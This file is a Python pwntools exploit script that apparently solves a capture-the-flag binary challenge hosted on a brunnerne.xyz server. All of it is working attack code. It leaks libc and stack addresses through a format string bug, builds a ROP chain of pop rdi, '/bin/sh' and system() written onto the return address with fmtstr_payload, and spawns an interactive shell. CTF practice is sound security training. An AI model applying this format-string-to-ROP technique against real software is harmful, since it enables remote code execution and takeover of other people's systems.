from pwn import *             

context.log_level = 'warning'  # Set pwntools log level to warning to reduce output

context.update(arch='x86_64', os='linux')  # Set architecture and OS for pwntools
context.terminal = ['wt.exe','wsl.exe']    # Set terminal for debugging

HOST="the-ingredient-shop-s-revenge.challs.brunnerne.xyz:32000"  # Remote host and port

ADDRESS,PORT=HOST.split(":")  # Split host and port

BINARY_NAME="./shop-revenge_patched"
binary = context.binary = ELF(BINARY_NAME, checksec=False)  # Load binary

if args.REMOTE:
    p = remote(ADDRESS,PORT)  # Connect to remote challenge
else:
    p = process(binary.path)  # Run locally

libc  = ELF('./libc.so.6', checksec=False)  # Load libc

# Leak libc address using format string vulnerability
payload = b'%45$p' # Leak stdlib address from stack
p.sendlineafter(b'exit', payload)
p.recvuntil(b"here is your choice\n")
leaked_stdlib = int(p.recvline().strip(),16)-0x2a1ca  # Calculate libc base address
warn(f"Leaked stdlib address: {leaked_stdlib:#x}")
# Replace 0x21ca with the actual offset of the leaked symbol in your libc
libc.address = leaked_stdlib
warn(f"Calculated libc base: {libc.address:#x}")

# Find ROP gadgets and important addresses in libc
bin_sh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" string in libc
system = libc.sym['system']             # Find system() function address
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Find "pop rdi; ret" gadget
ret=pop_rdi+1  # Find "ret" gadget (usually next instruction)

warn(f"ret: {ret:#x}")
warn(f"pop rdi; ret: {pop_rdi:#x}")
warn(f"/bin/sh: {bin_sh:#x}")
warn(f"system: {system:#x}")

# Leak stack address to find return address location
payload = b'%13$p' # Leak stack address
p.sendlineafter(b'exit', payload)
p.recvuntil(b"here is your choice\n")
stack_main_18 = int(p.recvline().strip(),16)+0x30  # Calculate location to overwrite
warn(f"stack_main+18: {stack_main_18:#x}")

# Overwrite return address with ROP chain using format string payloads
payload = fmtstr_payload(8, {stack_main_18+8: pop_rdi}, write_size='byte')  # pop rdi; ret
p.sendlineafter(b'exit', payload)
payload = fmtstr_payload(8, {stack_main_18+16: bin_sh}, write_size='byte')  # "/bin/sh" address
p.sendlineafter(b'exit', payload)
payload = fmtstr_payload(8, {stack_main_18+24: system}, write_size='byte')  # system() address
p.sendlineafter(b'exit', payload)
payload = fmtstr_payload(8, {stack_main_18: ret}, write_size='byte')        # ret gadget
p.sendlineafter(b'exit', payload)

# Get interactive shell
p.interactive()
